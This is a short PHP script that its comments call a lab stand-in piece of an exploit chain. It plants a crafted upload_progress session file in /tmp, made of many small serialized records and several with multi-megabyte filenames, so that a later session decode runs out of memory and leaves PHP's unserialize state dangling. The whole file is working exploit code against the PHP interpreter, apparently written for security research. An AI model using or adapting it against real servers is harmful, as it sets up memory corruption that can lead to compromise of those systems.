<?php
// Lab stand-in seat (the chain's docker-exec arm): write a big upload_progress session to
// /tmp so a later app-free upload_progress s_read+decode OOMs -> BG(unserialize) dangles.
// N small a:5 records (overflow var_entries) then big-filename records (decode-OOM size).
$sid=$argv[1]; $nsmall=(int)($argv[2]??100); $nbig=(int)($argv[3]??20); $fnlen=(int)($argv[4]??4000000);
function small($k){ return "upload_progress_s$k|a:5:{s:10:\"start_time\";i:1;s:14:\"content_length\";i:1;s:15:\"bytes_processed\";i:1;s:4:\"done\";b:0;s:5:\"files\";a:1:{i:0;a:7:{s:10:\"field_name\";s:1:\"f\";s:4:\"name\";s:5:\"a.bin\";s:8:\"tmp_name\";N;s:5:\"error\";i:0;s:4:\"done\";b:0;s:10:\"start_time\";i:1;s:15:\"bytes_processed\";i:1;}}}"; }
function big($k,$fnlen){ $fn=str_repeat('A',$fnlen); return "upload_progress_b$k|a:5:{s:10:\"start_time\";i:1;s:14:\"content_length\";i:1;s:15:\"bytes_processed\";i:1;s:4:\"done\";b:0;s:5:\"files\";a:1:{i:0;a:7:{s:10:\"field_name\";s:1:\"f\";s:4:\"name\";s:$fnlen:\"$fn\";s:8:\"tmp_name\";N;s:5:\"error\";i:0;s:4:\"done\";b:0;s:10:\"start_time\";i:1;s:15:\"bytes_processed\";i:1;}}}"; }
$f=fopen("/tmp/sess_$sid","w"); $tot=0;
for($i=0;$i<$nsmall;$i++){ $r=small($i); fwrite($f,$r); $tot+=strlen($r); }
for($i=0;$i<$nbig;$i++){ $r=big($i,$fnlen); fwrite($f,$r); $tot+=strlen($r); }
fclose($f); @chmod("/tmp/sess_$sid",0666);
echo "A_big[$sid] nsmall=$nsmall nbig=$nbig fnlen=$fnlen size=$tot\n";
